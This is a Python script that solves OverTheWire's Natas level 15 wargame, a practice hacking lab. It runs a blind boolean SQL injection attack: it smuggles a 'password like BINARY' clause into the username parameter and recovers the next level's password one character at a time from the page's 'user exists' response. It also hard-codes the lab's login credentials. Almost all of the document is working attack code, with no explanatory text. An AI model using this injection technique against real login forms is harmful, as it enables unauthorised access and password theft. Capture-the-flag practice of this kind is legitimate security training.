import httplib2
import urllib
h = httplib2.Http()
h.add_credentials('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
 
baseStr = "";
testCharacter="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
index = 0
while index < len(testCharacter):
    #urllib.urlencode -> transfer dictionary {name='vince',age=18} to "name=vince&age=18"
    data = urllib.urlencode(dict(username="natas16\" AND password like BINARY \"" + baseStr + testCharacter[index] + "%\"-- "))
    #data = urllib.urlencode(dict(username="natas16\" AND password like BINARY \"" + baseStr + testCharacter[index] + "%\"#"))
    resp, content = h.request("http://natas15.natas.labs.overthewire.org/index.php?" + data, method="POST")
    if ("This user exist" in str(content)):
        baseStr += testCharacter[index];
        print("Guess Password: " + baseStr)
        index = 0
        continue
    index += 1
print("Final Password: " + baseStr)
